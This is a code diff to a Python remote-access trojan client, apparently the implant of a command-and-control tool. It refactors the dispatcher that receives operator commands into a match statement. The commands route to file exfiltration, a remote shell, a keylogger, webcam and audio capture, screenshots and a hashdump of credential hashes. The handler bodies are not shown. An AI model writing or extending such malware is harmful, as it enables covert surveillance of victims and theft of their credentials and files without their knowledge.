@@ -1,7 +1,5 @@
 import socket
 import ssl
-import time
-import platform
 
 from src.client.utils.config import logger
 from utils.socket_utils import readline, read_buffer
@@ -60,50 +58,45 @@ class AgentClient:
         logger.info("[agent] Received command: %r", cmd)
         cmd = cmd.decode("utf-8")
 
-        if cmd.startswith("download "):
-            filepath = cmd.split()[1].replace("\\", "/")
-            self._send_file(filepath)
+        match cmd.split():
+            case ["download", filepath]:
+                filepath = filepath.replace("\\", "/")
+                self._send_file(filepath)
 
-        elif cmd.startswith("SEND_FILE "):
-            filename = cmd.split()[1]
-            self._download_file(filename)
+            case ["SEND_FILE", filename]:
+                self._download_file(filename)
 
-        elif cmd.startswith("shell "):
-            port = int(cmd.split()[1])
-            self._shell(port)
+            case ["shell", port] if port.isdigit():
+                self._shell(int(port))
 
-        elif cmd == "ipconfig":
-            self._ipconfig()
+            case ["keylogger" | "webcam_stream" | "record_audio", duration] if duration.isdigit():
+                duration_func = {
+                    "keylogger": self._keylogger,
+                    "webcam_stream": self._webcam_stream,
+                    "record_audio": self._record_audio
+                }[cmd.split()[0]]
+                duration_func(int(duration))
 
-        elif cmd == "hashdump":
-            self._hashdump()
+            case ["ipconfig"]:
+                self._ipconfig()
 
-        elif cmd == "screenshot":
-            self._screenshot()
+            case ["hashdump"]:
+                self._hashdump()
 
-        elif cmd.startswith("search "):
-            self._search_file(cmd)
+            case ["screenshot"]:
+                self._screenshot()
 
-        elif cmd == "quit":
-            self.running = False
+            case ["webcam_snapshot"]:
+                self._webcam_snapshot()
 
-        elif cmd.startswith("keylogger "):
-            duration = int(cmd.split()[1])
-            self._keylogger(duration)
+            case ["quit"]:
+                self.running = False
 
-        elif cmd == "webcam_snapshot":
-            self._webcam_snapshot()
+            case ["search", searchpattern]:
+                self._search_file(cmd)
 
-        elif cmd.startswith("webcam_stream "):
-            duration = int(cmd.split()[1])
-            self._webcam_stream(duration)
-
-        elif cmd.startswith("record_audio "):
-            duration = int(cmd.split()[1])
-            self._record_audio(duration)
-
-        else:
-            pass
+            case _:
+                pass
 
     def _shell(self, port):
         try:
